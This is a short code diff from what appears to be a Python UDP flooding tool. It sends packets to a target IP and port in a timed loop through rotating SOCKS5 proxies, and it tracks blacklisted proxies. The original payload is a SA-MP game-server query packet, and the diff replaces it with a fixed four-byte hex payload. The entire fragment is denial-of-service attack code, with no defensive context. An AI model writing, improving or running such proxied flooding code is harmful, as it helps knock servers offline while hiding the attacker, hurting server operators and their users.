@@ -52,6 +52,9 @@ start_time = time.time()
 blacklisted_proxies = set()
 whitelisted_proxies = set()
 
+hexdump = "08 1e 77 da"
+payload = bytes.fromhex(hexdump.replace(" ", ""))
+
 def create_proxied_socket(proxy_host, proxy_port):
     s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
     s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
@@ -73,7 +76,7 @@ def worker():
     while time.time() - start_time < times:
         if proxy not in blacklisted_proxies:
             try:
-                payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'p'
+                #payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'p'
                 udp.sendto(payload, target)
 
             except Exception as error:
